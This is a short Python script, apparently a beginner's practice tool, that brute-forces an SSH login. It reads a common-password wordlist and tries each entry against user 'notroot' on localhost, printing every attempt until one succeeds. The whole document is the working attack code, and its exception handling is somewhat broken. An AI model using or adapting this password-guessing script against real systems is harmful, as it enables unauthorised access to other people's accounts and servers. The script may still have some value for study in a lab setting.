#! /usr/bin/env python3
from pwn import * 
import paramiko
host= "127.0.0.1"
username ="notroot"
attempts=0
with open ("ssh-common-password.txt","r") as password_list :
 for password in password_list:
    password = password.strip("\n")
    try:
         print("[{}] Attempting password: '{}'!" . format (attempts ,password))
         responce = ssh(host=host, user=username ,password=password , timeout=1)
         if responce.connected():
              print (" [>] Vaild password found: '{}' !" . format(password))
              break
           
              
    except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invaild password!")
            responce.close()
    attempts +=1
         
